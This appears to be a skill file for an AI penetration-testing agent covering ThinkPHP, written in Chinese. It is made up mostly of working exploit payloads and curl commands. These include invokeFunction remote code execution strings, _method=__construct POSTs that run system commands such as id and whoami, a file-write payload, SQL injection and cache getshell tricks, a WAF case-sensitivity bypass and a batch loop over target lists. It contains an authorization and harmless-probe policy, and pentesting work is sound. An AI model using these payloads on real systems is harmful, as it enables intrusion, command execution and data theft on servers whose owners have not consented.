---
name: framework-thinkphp
description: ThinkPHP 专项：THINK_VERSION/报错页版本指纹、5.0.x/5.1.x invokeFunction RCE payload 家族、5.0.23 _method=__construct 通杀、2.x/3.2.x 老洞、路由存在性 oracle 与 WAF 大小写对抗、POC 集合批量验证
whenToUse: 指纹或报错页显示 ThinkPHP、URL 带 ?s= 路由风格、PHP 资产需 RCE 面排查时
role: vuln-scan
enabled: true
---

# ThinkPHP 框架专项

## 版本指纹

| 信号 | 判定 |
|---|---|
| 报错页含 `ThinkPHP V5.0.x` / `THINK_VERSION` 常量 | 直接版本 |
| 报错栈 `think\exception\ErrorException`、`think\App::invokeFunction` | 5.x |
| `?s=` 参数路由、URL `/index.php/module/action` | TP 风格路由 |
| 报错页模板五角星 TP logo（ trace 页） | 5.x debug 开启 |

```bash
curl -s "http://$TARGET/?s=1" | grep -ioE "thinkphp[ v]*[0-9.]+|ThinkPHP[0-9.]*"
curl -s "http://$TARGET/public/?s=.|think\\config/get&name=database.username"   # 5.0.22 配置读取
```

## 5.0.x / 5.1.x invokeFunction RCE payload 家族

| 版本 | Payload |
|---|---|
| 5.0.x（≤5.0.23 通用） | `?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1` |
| 5.1.x | `?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1` |
| 5.1.x 变体 | `?s=index/\think\Request/input&filter=phpinfo&data=1`；`?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1` |
| 5.1 写文件 | `?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E`（写探测页即可） |
| 未知版本探活 | `?s=index/\think\module/action/param1/${@phpinfo()}`（2.x 风格也吃） |

无害探测规则：家族里**统一用 `phpinfo()`/`THINK_VERSION` 探测**，确认解析成立后才有下一步；`system`/`exec` 只在授权且探活成功后发。

## 5.0.23 通杀（POST `_method=__construct`，debug 无关）

```bash
# 完整版 5.0.x 通用：filter 覆盖为 system，REQUEST_METHOD 即命令
curl -s "http://$TARGET/index.php?s=captcha" -d "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id"
# 5.0.10 完整版变体
curl -s "http://$TARGET/index.php?s=index/index/index" -d "s=whoami&_method=__construct&method&filter[]=system"
# 5.1/5.2/5.0 后期变体
curl -s "http://$TARGET/public/index.php" -d "c=phpinfo&f=1&_method=filter"
```

判定 oracle：命令结果出现在响应 body（而非拦截页/404）即成立；响应 404 但标题含 ThinkPHP → 路由风格在、该链不适用。

## 2.x 与 3.2.x

| 版本 | 要点 |
|---|---|
| 2.x | `?s=/Home/index/index/name/${@phpinfo()}`（preg_replace /e 时代）；配合上面"未知版本探活" |
| 3.2.x | 无 invokeFunction；打 I 函数 where 注入（`?username[0]=exp&username[1]=1 and updatexml(1,concat(0x7e,version()),1)`）、缓存文件 getshell（先 `S()` 写缓存再猜 `/Application/Runtime/Temp/md5(条件).php`）、日志泄露 `/Application/Runtime/Logs/*/yy_mm_dd.log` |
| 5.x 日志 | `/runtime/log/202610/31.log`、5.0 `/runtime/log/202610/31.log` 敏感信息核对 |

## 路由存在性 oracle（衔接本地 POC）

批量打 invokeFunction 前先判定**路由层面是否可解析**，避免把 WAF 拦截误判成不存在：

- `pocs/thinkphp-url_route_must-路由存在性-oracle-含-think-multi-app-判别/tp_route_oracle.sh` —— 用 `url_route_must` 配置差异做存在性三态判定，含多应用模式识别。
- `pocs/thinkphp-站点三连判定-edgeone-大小写绕过-s-路由覆盖-url_route_must-识别/tp-probe.sh` —— 指纹/路由/版本三连判定。
- WAF 场景：`pocs/safeline-拦截页伪装成频控-签名大小写敏感绕过-thinkphp-__construct-家族通用/safeline_case_bypass.sh` —— 拦截页伪装成频控的识别 + 签名大小写敏感绕过，`__construct` 家族 payload 被 WAF 面拦时优先看此 poc。

## 批量验证（POC 集合仓库用法）

`knowledge-sources/thinkphp-RCE-POC-Collection/` 是 35 条 payload 的清单式仓库（5.0.22/5.0.21/5.1.29/5.0.23/2.x/SQL 注入族）。批量脚本骨架：

```bash
while read -r url; do
  for p in \
    "?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1" \
    "?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"; do
    out=$(curl -s -m 8 "$url$p"); echo "$out" | grep -q "phpinfo\|THINK_VERSION" && echo "[+] $url $p"
  done
done < targets.txt
```

注意：判定串必须来自 `phpinfo()` 输出特征（如 `PHP Version`），不能匹配回显原文——防反射型误报；并发 ≤ 3，加超时。

## 纪律

- 仅授权范围内测试；探测只发 `phpinfo()`/配置读取级 payload，写文件类只写内容可自证的无害探测页且事后提醒客户清理。
- 证据脱敏：配置读取结果（DB 账号）只证明可读，报告打码密码明文。
- 不破坏目标：不跑写 shell 后的权限维持；SQL 注入族 payload 用 `sleep`/`extractvalue md5` 定性即停。

## 产出约定

- 记录：版本指纹、命中 payload、响应特征（正文关键字）、是否路由层可达。
- 回填 `redteam_poc_add`：category=thinkphp（thinkphp-rce / thinkphp-bypass / thinkphp-sqli 分列），language=php/http，usage 附 curl 复现命令。

<!-- 改编自: SkyBlueEternal/thinkphp-RCE-POC-Collection, zhzyker/exphub, 2026-10-31 -->
